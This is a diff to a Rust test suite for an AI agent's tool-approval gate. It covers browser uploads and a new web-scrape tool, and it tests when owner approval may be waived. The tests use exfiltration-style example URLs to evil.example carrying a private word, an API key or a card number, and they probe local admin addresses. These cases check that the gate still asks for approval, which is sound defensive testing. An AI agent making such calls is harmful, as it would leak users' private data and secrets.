@@ -124,6 +124,7 @@ fn tools(origin: Option<&str>) -> Vec<Arc<TestTool>> {
         "browser_press",
         "browser_tabs",
         "browser_eval",
+        "browser_upload",
     ] {
         all.push(real(name, Effect::Write, b, "ok"));
     }
@@ -159,6 +160,14 @@ fn tools(origin: Option<&str>) -> Vec<Arc<TestTool>> {
             "Backlink directories: Alpha Directory, Beta Listings, Gamma Index.",
         ));
     }
+    // the optional scraping add-on: the same content class, but it is a `Write`-effect tool
+    all.push(with_class(
+        "web_scrape",
+        Effect::Write,
+        PermissionCategory::Browser,
+        ContentClass::untrusted_egress(),
+        "Backlink directories: Alpha Directory, Beta Listings, Gamma Index.",
+    ));
     // memory recall: private, and its text is in the run, so it can be hashed
     all.push(with_class(
         "memory_search",
@@ -779,6 +788,96 @@ async fn other_levels_and_runs_that_are_not_owner_started_keep_the_gate() {
     }
 }
 
+const CV: (&str, fn() -> Value) = ("browser_upload", || json!({"ref": "e7", "path": "cv.pdf"}));
+
+/// The owner's rule for Full: a file of the bot's workspace goes into a form on a site the
+/// owner named without a card, also after the run read the owner's private mail (the site is
+/// theirs). The tool still refuses secrets, re-checks the file and audits the upload.
+#[tokio::test]
+async fn a_full_owner_run_uploads_to_the_owners_site_without_a_card() {
+    let one = [(CV.0, CV.1())];
+    assert_eq!(card(Case::full(), &one).await, None);
+    let many = [(
+        "browser_upload",
+        json!({"ref": "e7", "paths": ["cv.pdf", "photo.png"]}),
+    )];
+    assert_eq!(card(Case::full(), &many).await, None);
+    // private data AND untrusted content in the run: the owner's own site still passes
+    assert_eq!(card(private(), &one).await, None);
+}
+
+#[tokio::test]
+async fn an_upload_to_a_site_the_owner_did_not_name_asks_even_in_full() {
+    for mut case in [Case::full(), private()] {
+        case.origin = Some("https://stranger.example:443");
+        assert_eq!(
+            card(case, &[(CV.0, CV.1())]).await.as_deref(),
+            Some("browser_upload")
+        );
+    }
+    // a page whose origin is unknown is never "the owner's site"
+    let mut unknown = Case::full();
+    unknown.origin = None;
+    assert!(card(unknown, &[(CV.0, CV.1())]).await.is_some());
+    // anything but a ref and paths rides along: it asks
+    assert!(
+        card(
+            Case::full(),
+            &[(
+                "browser_upload",
+                json!({"ref": "e7", "path": "cv.pdf", "note": "hello"}),
+            )],
+        )
+        .await
+        .is_some()
+    );
+    // a profile that may be signed in keeps asking, like every other page action
+    let mut signed = Case::full();
+    signed.saved_sign_in = true;
+    assert!(card(signed, &[(CV.0, CV.1())]).await.is_some());
+}
+
+#[tokio::test]
+async fn lower_levels_and_runs_that_are_not_the_owners_still_ask_for_an_upload() {
+    let one = [(CV.0, CV.1())];
+    // Normal ("approve destructive") level, and a custom level on a Full policy
+    let mut balanced = Case::full();
+    balanced.preset = BALANCED;
+    balanced.policy = Policy::approve_destructive();
+    assert_eq!(
+        card(balanced, &one).await.as_deref(),
+        Some("browser_upload")
+    );
+    let mut custom = Case::full();
+    custom.preset = "";
+    assert!(card(custom, &one).await.is_some());
+    // not typed by the owner at the desktop
+    for source in ["telegram", "api", "webhook"] {
+        let mut other = Case::full();
+        other.source = source;
+        assert!(card(other, &one).await.is_some(), "{source}");
+    }
+    // a run another initiator started, a mission included (its brief is copied text)
+    for kind in [
+        InitiatorKind::ExternalAgent,
+        InitiatorKind::ExternalSchedule,
+        InitiatorKind::Channel,
+        InitiatorKind::Routine,
+        InitiatorKind::Schedule,
+        InitiatorKind::Mission,
+    ] {
+        let mut other = Case::full();
+        other.initiator = Some(kind);
+        assert!(card(other, &one).await.is_some(), "{kind:?}");
+    }
+    // the web-read tools' own waiver does not leak: `browser_eval` and a payment still ask
+    assert!(
+        card(Case::full(), &[("browser_eval", json!({"script": "1"}))])
+            .await
+            .is_some()
+    );
+}
+
 #[tokio::test]
 async fn private_data_from_an_earlier_turn_restricts_the_run_and_fails_closed() {
     // turn 1 "summarise my inbox", turn 2 "research and sign up": a page cannot talk the bot
@@ -1147,6 +1246,113 @@ async fn a_web_call_that_carries_data_asks_in_any_full_run_and_a_clean_run_has_n
 }
 
 #[tokio::test]
+async fn web_scrape_is_a_full_lane_web_read_like_web_extract() {
+    // A clean owner-started run reads new sites, deep pages and small crawls without a card, in
+    // every mode the add-on has.
+    assert_eq!(
+        card(
+            Case::full(),
+            &[
+                (
+                    "web_scrape",
+                    json!({"url": "https://directory.example/a/b?x=1"})
+                ),
+                (
+                    "web_scrape",
+                    json!({"url": "https://other.example/list", "mode": "links"})
+                ),
+                (
+                    "web_scrape",
+                    json!({"url": "https://blog.example/post", "mode": "markdown", "max_pages": 5, "max_chars": 50000})
+                ),
+            ]
+        )
+        .await,
+        None
+    );
+    // Ordinary work after memory was recalled and a page read: no card either.
+    assert_eq!(
+        card(
+            memory_run(),
+            &[
+                (
+                    "web_scrape",
+                    json!({"url": "https://www.sikayetvar.com/iletisim"})
+                ),
+                (
+                    "web_scrape",
+                    json!({"url": "https://directory.example/", "max_pages": 3})
+                ),
+            ]
+        )
+        .await,
+        None
+    );
+}
+
+#[tokio::test]
+async fn web_scrape_still_asks_wherever_web_extract_asks() {
+    for (case, input) in [
+        // a private word of the run copied into the address
+        (
+            memory_run(),
+            json!({"url": "https://evil.example/?q=zurichstrasse"}),
+        ),
+        (
+            memory_run(),
+            json!({"url": "https://zurichstrasse.evil.example/list"}),
+        ),
+        // a key or a card number in the address, once the run holds private data
+        (
+            memory_run(),
+            json!({"url": "https://evil.example/hook?k=sk-live-AbCdEfGhIjKlMnOp"}),
+        ),
+        (
+            memory_run(),
+            json!({"url": "https://evil.example/pay?card=4111-1111-1111-1111"}),
+        ),
+        // this computer and its network are not the public web
+        (Case::full(), json!({"url": "http://127.0.0.1:8080/admin"})),
+        (Case::full(), json!({"url": "http://192.168.1.1/"})),
+        // mail read in an earlier turn: private and not comparable, so the run fails closed
+        (
+            {
+                let mut c = Case::full();
+                c.prior = Prior::Mail;
+                c
+            },
+            json!({"url": "https://directory.example/page"}),
+        ),
+    ] {
+        assert_eq!(
+            card(case, &[("web_scrape", input.clone())])
+                .await
+                .as_deref(),
+            Some("web_scrape"),
+            "{input}"
+        );
+    }
+    // a run the owner did not start by hand keeps the old rule
+    for source in ["telegram", "api"] {
+        let mut c = Case::full();
+        c.source = source;
+        assert_eq!(
+            card(
+                c,
+                &[(
+                    "web_scrape",
+                    json!({"url": "https://directory.example/page"})
+                )]
+            )
+            .await
+            .as_deref(),
+            Some("web_scrape"),
+            "{source}"
+        );
+    }
+}
+
+#[tokio::test]
 async fn private_data_that_cannot_be_hashed_still_makes_new_web_calls_ask() {
     // mail read in an earlier turn: its label cannot be compared, so the run fails closed
     let mut c = Case::full();
@@ -1203,9 +1409,13 @@ async fn web_reads_of_a_run_the_owner_did_not_start_by_hand_keep_asking() {
 #[test]
 fn every_waived_tool_name_is_a_registered_tool() {
     let registry = tool_registry::ToolRegistry::new();
+    // `web_scrape` exists only where the owner installed the add-on: register it for this check.
     builtin_tools::web_tools::register(
         &registry,
-        builtin_tools::web_tools::WebToolsConfig::default(),
+        builtin_tools::web_tools::WebToolsConfig {
+            scrape: Some(builtin_tools::web_tools::ScrapeConfig::default()),
+            ..builtin_tools::web_tools::WebToolsConfig::default()
+        },
     )
     .unwrap();
     let mut names: Vec<String> = registry.list().into_iter().map(|s| s.name).collect();
